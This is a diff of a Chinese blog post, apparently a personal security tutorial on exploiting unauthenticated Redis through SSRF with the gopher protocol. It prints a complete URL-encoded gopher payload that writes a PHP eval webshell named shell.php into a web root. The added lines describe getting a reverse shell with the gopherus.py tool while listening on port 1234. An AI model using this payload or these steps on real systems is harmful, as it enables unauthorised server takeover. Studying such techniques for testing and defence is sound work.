@@ -84,6 +84,8 @@
 <p>然后将获得的数据复制下来</p>
 <p>然后对这个数据进行处理。先进行一次URL编码[<a target="_blank" rel="noopener" href="http://tool.oschina.net/encode?type=4%5D%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E6%AF%8F%E4%B8%80%E4%B8%AA%E6%8D%A2%E8%A1%8C%E7%94%A8%0D%0A%E4%BB%A3%E6%9B%BF%E8%BD%AC%E7%A0%81%E5%87%BA%E6%9D%A5%E7%9A%84%0A,%E8%AE%B0%E5%BE%97%E8%A6%81%E6%8A%8A?%E6%9B%BF%E6%8D%A2%E4%B8%BA?">http://tool.oschina.net/encode?type=4]，然后将每一个换行用%0d%0a代替转码出来的%0a,记得要把?替换为%3f</a> 然后我们将这个东西再加上gopher的前缀进行执行。<br><code>gopher://127.0.0.1:6379/*1%0D%0A$7%0D%0ACOMMAND%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$22%0D%0A/home/wwwroot/default/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$4%0D%0Agaia%0D%0A$24%0D%0A%3C%3fphp%20eval($_POST%5Ba%5D);%3f%3E%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A</code></p>
 <p>就先到这里了，处理挺麻烦，我准备写一个python脚本，但是我现在还不会准备先学习一下</p>
+<p>然后把这段poc复制袭来 打开浏览器把他以参数的形式上传到测试的网站然后执行，就会生成shell.php<br>感觉十分麻烦，别人也感觉麻烦<br>有前辈已经写过了工具很简单可以直接拿来使用<br>gopherus.py,在github可以下载。[这个工具支持多种Gopher协议生成攻击代码]<br>下载好后直接使用</p>
+<p>我们选中redis模块[python gopherus.py –exploit redis]<br>然后很贴心的问我要webshell还是反弹shell，然后让我们写接受反弹shell的Ip<br>虽然最后出了点小问题，但是他有显示了POC代码，直接复制粘贴就行，这里监听的是1234端口。<br>那我们监听1234端口吧<br>之后就会成功获得反弹shell<br>很多非加密访问的未授权访问都可以尝试使用Gopher协议去尝试利用!</p>
 
                 
                 <p class="end">__END__</p>
